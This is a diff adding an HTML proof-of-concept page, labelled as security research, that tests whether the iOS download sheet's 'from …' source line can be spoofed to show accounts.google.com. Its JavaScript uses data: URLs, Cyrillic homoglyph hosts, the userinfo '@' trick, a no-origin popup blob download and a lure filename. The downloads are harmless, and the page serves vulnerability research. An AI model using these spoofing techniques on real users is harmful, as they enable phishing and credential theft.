@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Download Source Line Spoof</title>
+<style>
+body{font-family:-apple-system,sans-serif;max-width:480px;margin:0 auto;padding:24px 16px;background:#fff;color:#1d1d1f}
+h2{font-size:18px;margin-bottom:6px}
+p{font-size:14px;color:#666;line-height:1.5;margin-bottom:14px}
+.banner{display:inline-block;background:#fff3cd;border:1px solid #ffe08a;border-radius:6px;padding:6px 10px;font-size:12px;color:#7a5c00;margin-bottom:14px}
+button{display:block;width:100%;padding:15px;border:none;border-radius:12px;font-size:16px;font-weight:600;cursor:pointer;margin-bottom:8px;color:#fff;background:#007aff}
+button:active{opacity:.7}
+.info{font-size:12px;color:#999;margin-top:-4px;margin-bottom:14px}
+code{font-family:ui-monospace,monospace;font-size:11px;color:#555;word-break:break-all}
+</style>
+</head>
+<body>
+<div class="banner">Security research PoC</div>
+<h2>Download "from …" source spoof</h2>
+<p>Each button opens the iOS download sheet. <b>Read the small "from …" line under the filename.</b> Goal: can that trusted-source line be made to read <code>accounts.google.com</code>?</p>
+
+<button onclick="b1()">1 — data: source as a google URL (text)</button>
+<div class="info">href is a plain data: URL whose text is <code>https://accounts.google.com/…</code>. Does the "from" line show google.com?</div>
+
+<button onclick="b2()">2 — homoglyph google (Cyrillic letters)</button>
+<div class="info">Same, but the host uses look-alike Cyrillic letters. Does it render as "google.com" or punycode/xn--?</div>
+
+<button onclick="b3()">3 — userinfo @ trick</button>
+<div class="info"><code>https://accounts.google.com@…</code> — real host is elsewhere. Does the sheet show google.com first?</div>
+
+<button onclick="b4()" style="background:#34c759">4 — real file hosted on google.com</button>
+<div class="info">Downloads a real asset from www.google.com. Does "from" honestly show www.google.com?</div>
+
+<button onclick="b5()" style="background:#ff9500">5 — blob from no-origin popup</button>
+<div class="info">Creates the download inside the empty-bar popup. What origin does "from" show — blob:null, or an inherited one?</div>
+
+<button onclick="b6()" style="background:#af52de">6 — filename-only spoof</button>
+<div class="info">Neutral source, but filename is fully attacker-chosen. Shows how prominent/controllable the filename line is.</div>
+
+<script>
+function dl(href,name){
+  var a=document.createElement('a');
+  a.href=href;a.download=name;
+  a.style.display='none';
+  document.body.appendChild(a);a.click();
+  setTimeout(function(){a.remove()},1000);
+}
+
+// 1: plain-text data: URL whose visible text is a google URL
+function b1(){
+  dl('data:text/plain,https://accounts.google.com/account/document-download','document.txt');
+}
+
+// 2: homoglyph host (Cyrillic а с о о) inside a data: URL text
+function b2(){
+  dl('data:text/plain,https://ассоunts.gооgle.com/verify','document.txt');
+}
+
+// 3: userinfo authority — google.com as username, real host after @
+function b3(){
+  var a=document.createElement('a');
+  a.href='https://accounts.google.com@example.com/document.txt';
+  a.download='document.txt';
+  a.style.display='none';
+  document.body.appendChild(a);a.click();
+  setTimeout(function(){a.remove()},1000);
+}
+
+// 4: genuine cross-origin file on google.com
+function b4(){
+  var a=document.createElement('a');
+  a.href='https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png';
+  a.download='image.png';
+  a.target='_self';
+  a.style.display='none';
+  document.body.appendChild(a);a.click();
+  setTimeout(function(){a.remove()},1000);
+}
+
+// 5: blob download from inside the no-origin popup
+function b5(){
+  var a=document.createElement('a');
+  a.href='https://accounts.google.com/signin/v2/identifier';
+  a.target='dlpop';
+  a.style.display='none';
+  document.body.appendChild(a);a.click();a.remove();
+  setTimeout(function(){
+    var w=window.open('','dlpop');
+    if(!w)return;
+    w.document.open();
+    w.document.write('<!DOCTYPE html><meta name=viewport content="width=device-width,initial-scale=1"><title>Download test (research)</title><body style="font-family:-apple-system;padding:40px 24px;text-align:center"><div style="display:inline-block;background:#fff3cd;border:1px solid #ffe08a;border-radius:6px;padding:6px 10px;font-size:12px;color:#7a5c00">Security research PoC</div><p style="color:#5f6368;font-size:13px">Triggering blob download…</p>');
+    w.document.close();w.stop();
+    setTimeout(function(){
+      try{
+        var blob=new w.Blob(['research note from no-origin popup'],{type:'application/octet-stream'});
+        var url=w.URL.createObjectURL(blob);
+        var a2=w.document.createElement('a');
+        a2.href=url;a2.download='document.txt';
+        w.document.body.appendChild(a2);a2.click();
+      }catch(e){w.document.body.innerHTML+='<p style="color:#c00">'+e.message+'</p>'}
+    },250);
+  },50);
+}
+
+// 6: filename fully attacker-controlled
+function b6(){
+  dl('data:text/plain,harmless','Google Account - verify document.txt');
+}
+</script>
+</body>
+</html>
